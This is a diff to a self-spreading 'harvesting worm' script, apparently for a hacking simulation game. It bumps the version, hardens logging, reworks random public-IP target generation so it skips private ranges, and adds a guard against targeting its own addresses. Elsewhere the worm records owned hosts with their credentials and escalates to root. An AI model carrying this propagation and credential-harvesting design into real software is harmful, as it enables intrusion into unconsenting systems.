@@ -1,5 +1,5 @@
 // worm — aggressive staged harvesting worm (GreyLLM standard)
-// WORM_VERSION = "4" (daemon auto-installs/updates this file)
+// WORM_VERSION = "5" (daemon auto-installs/updates this file)
 //
 // Per host: break in with the standard ~/exploit tool, ESCALATE LOCALLY
 // to root (victim-side exploit -L, password-change attempts, root
@@ -53,7 +53,13 @@ wlog = function(line)
 		if base == null then
 			base = ""
 		end if
-		lf.set_content(base + line + NL)
+		want = base + line + NL
+		lf.set_content(want)
+		// tree-flush race check: verify, retry once
+		back = lf.get_content
+		if back == null or back != want then
+			lf.set_content(want)
+		end if
 	end if
 	return null
 end function
@@ -125,23 +131,35 @@ appendFile = function(comp, path, text)
 end function
 
 rndByte = function(salt)
-	// rnd() is deterministic per session — mix the wall clock so every
-	// run explores different addresses
-	t = time() + salt * 7919
-	s = str(t * 2654435761)
-	digits = s.replace(".", "").replace("-", "")
-	n = val(digits[1:]) % 254
-	if n == null or n < 1 then
-		n = salt % 254 + 1
+	// decorrelated pseudo-random byte: different arithmetic per call so
+	// consecutive bytes never share offsets (rnd() alone is deterministic)
+	// time() is a FLOAT and there is no integer division — every result
+	// must be floored or the address bytes become decimals
+	t = floor(time())
+	n1 = floor((t * 7919 + salt * 104729) % 251)
+	n2 = floor((floor(t / 7) + salt * 31 + 97) % 241)
+	n3 = floor(((t % 65536 * salt) + 337) % 239)
+	pick = salt % 3
+	if pick == 0 then
+		r = n1
+	else if pick == 1 then
+		r = n2
+	else
+		r = n3
 	end if
-	return n
+	r = floor(r + salt % 17)
+	r = floor(r % 254)
+	if r == null or r < 1 then
+		r = salt % 253 + 1
+	end if
+	return r
 end function
 
 rndPublicIp = function(counter)
 	a = rndByte(counter)
-	b = rndByte(counter + 1)
-	c = rndByte(counter + 3)
-	d = rndByte(counter + 7)
+	b = rndByte(counter * 5 + 11)
+	c = rndByte(counter * 13 + 29)
+	d = rndByte(counter * 29 + 71)
 	// keep clear of private/reserved ranges
 	if a == 10 or a == 127 or a == 172 or a == 192 or a < 20 then
 		a = a % 100 + 30
@@ -626,8 +644,16 @@ main = function(params)
 	frontier = state[0]
 	owned = state[1]
 	done = state[2]
+	selfLan = comp.local_ip
+	selfPub = comp.public_ip
+	selfGuard = function(ip)
+		if ip == selfLan or ip == selfPub then
+			return true
+		end if
+		return false
+	end function
 	for s in seeds
-		if knownIp(frontier, owned, done, s) == false then
+		if knownIp(frontier, owned, done, s) == false and selfGuard(s) == false then
 			frontier.push(s)
 		end if
 	end for
@@ -637,7 +663,7 @@ main = function(params)
 			devs = r.devices_lan_ip
 			if devs != null then
 				for d in devs
-					if knownIp(frontier, owned, done, d) == false then
+					if knownIp(frontier, owned, done, d) == false and selfGuard(d) == false then
 						frontier.push(d)
 					end if
 				end for
@@ -661,7 +687,7 @@ main = function(params)
 		for rI in range(1, rndN)
 			rip = rndPublicIp(rndCounter + cycle * 31)
 			rndCounter = rndCounter + 1
-			if knownIp(frontier, owned, done, rip) == false then
+			if knownIp(frontier, owned, done, rip) == false and selfGuard(rip) == false then
 				frontier.push(rip)
 			end if
 		end for
@@ -679,7 +705,7 @@ main = function(params)
 				newIps = res[1]
 				owned.push([ip, user, pass])
 				for nip in newIps
-					if knownIp(frontier, owned, done, nip) == false and is_valid_ip(nip) == 1 then
+					if knownIp(frontier, owned, done, nip) == false and is_valid_ip(nip) == 1 and selfGuard(nip) == false then
 						frontier.push(nip)
 					end if
 				end for
